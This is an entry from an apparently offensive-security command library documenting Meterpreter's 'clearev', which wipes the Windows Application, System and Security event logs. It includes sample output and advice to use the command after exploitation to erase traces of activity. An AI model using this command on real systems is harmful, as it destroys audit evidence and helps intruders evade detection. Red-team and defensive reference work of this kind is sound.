---
id: 31d1cfd2-2ae4-4d68-8c6a-a163f5094b07
name: metasploit-clear-event-logs
type: command
executor: metasploit
data: clearev
output: |-
  meterpreter > clearev 
  [*] Wiping 1919 records from Application...
  [*] Wiping 1406 records from System...
  [*] Wiping 7980 records from Security...
created_at: '2019-12-18T18:42:07.352206+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - defense-evasion
  - meterpreter
verified: true
validated: true
---

# metasploit-clear-event-logs

## Command

```metasploit
clearev
```

## Description

This Meterpreter command clears the Windows event logs from an active session, targeting the Application, System, and Security logs to remove indicators of compromise. Use it during post-exploitation to erase traces of your activity, but be aware it may itself be logged or detected by monitoring tools.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | The command has no parameters; it automatically targets standard Windows event logs. | N/A |

## Examples

### Basic Usage

From a Meterpreter prompt:

```metasploit
clearev
```

This wipes all eligible logs without further configuration.

### Advanced Usage

No advanced options are available; the command is atomic. For selective clearing, consider native Windows tools via Meterpreter's 'execute' command, but 'clearev' is designed for comprehensive wiping.

## Expected Output

```
meterpreter > clearev 
[*] Wiping 1919 records from Application...
[*] Wiping 1406 records from System...
[*] Wiping 7980 records from Security...
```

The output shows the progress and count of records removed from each log category, confirming successful execution upon completion.

## Related

- [[procedures/Clear-Windows-Event-Logs-via-Meterpreter]]
- [[tools/Metasploit-Framework]]
